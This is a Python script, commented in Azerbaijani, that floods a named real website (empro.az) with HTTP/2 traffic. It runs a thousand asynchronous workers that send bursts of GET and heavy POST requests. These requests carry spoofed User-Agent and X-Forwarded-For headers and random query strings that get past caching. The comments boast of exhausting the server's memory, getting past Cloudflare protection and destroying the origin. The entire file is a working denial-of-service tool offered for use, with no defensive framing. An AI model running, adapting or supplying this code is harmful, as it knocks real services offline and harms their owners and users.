import asyncio
import httpx
import random
import time
import string

# --- HƏDƏF ---
TARGET_URL = "https://empro.az/"
# Asinxron olduğu üçün 1000 worker thread limitinə ilişmədən 100 qat daha güclü vurur
WORKERS = 1000 
BATCH_SIZE = 150 # Hər worker eyni anda 150 'öldürücü' kadr göndərir

def r_str(n=15):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def protocol_slaughter(worker_id, client):
    # Bu workerlər Cloudflare-in analiz motorunu daxildən kilitləyir
    while True:
        try:
            # Dinamik brauzer və IP təqlidi
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(4,6)}.0.0.0 Safari/537.36",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}.{random.randint(1,254)}",
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Connection": "keep-alive"
            }

            # Keşlənməni bypass edən ağır dinamik URL
            url = f"{TARGET_URL}?v={time.time()}&id={r_str(30)}&search={r_str(100)}"
            
            # BURST MODE: HTTP/2 Rapid Reset & Frame Flooding
            # Content-Length manipulyasiyası ilə serverin RAM-ını dondururuq
            tasks = []
            for _ in range(BATCH_SIZE):
                if _ % 5 == 0:
                    # Ağır POST (Origin-i daxildən bitirir)
                    tasks.append(client.post(url, headers=headers, content=r_str(1500)))
                else:
                    # Sürətli GET (Connection portlarını kilitləyir)
                    tasks.append(client.get(url, headers=headers))
            
            # Bütün dalğanı saniyə içində serverə çırp!
            await asyncio.gather(*tasks, return_exceptions=True)
            
        except Exception:
            await asyncio.sleep(0.01)

async def main():
    print(f"💀 TOTAL APOCALYPSE INITIALIZED: {TARGET_URL}")
    print("[!] Performance: Async Multiplexing (No Thread Limits).")
    
    # TCP hüdudlarını ləğv edən yüksək sürətli daxili client
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True, # BU SİRRİDİR: HTTP/2 olmadan qorumaları keçmək olmur
        verify=False, 
        limits=limits, 
        timeout=10.0 # Server donanda bağlantını buraxma (Slowloris effekti)
    ) as client:
        
        workers = [protocol_slaughter(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
